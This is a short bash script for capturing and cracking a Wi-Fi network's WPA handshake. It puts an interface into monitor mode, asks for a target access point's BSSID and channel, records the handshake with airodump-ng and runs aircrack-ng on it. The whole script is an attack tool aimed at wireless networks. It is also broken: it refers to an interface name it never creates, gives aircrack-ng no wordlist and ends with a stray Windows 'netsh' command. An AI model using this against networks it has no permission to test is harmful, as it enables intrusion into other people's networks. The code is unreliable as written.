#!/bin/bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo airodump-ng wlan0mon
echo "Enter the BSSID of the target access point:"
read bssid
echo "Enter the channel number of the target access point:"
read channel
echo "Enter the name of the file you want to save the handshake package to:"
read filename
sudo airodump-ng --bssid $bssid -c $channel -w $filename wlan0mon
echo "Waiting for the handshake package to be captured. Press CTRL + C to stop the capture process."
sudo aircrack-ng $filename.cap
netsh wlan show networks
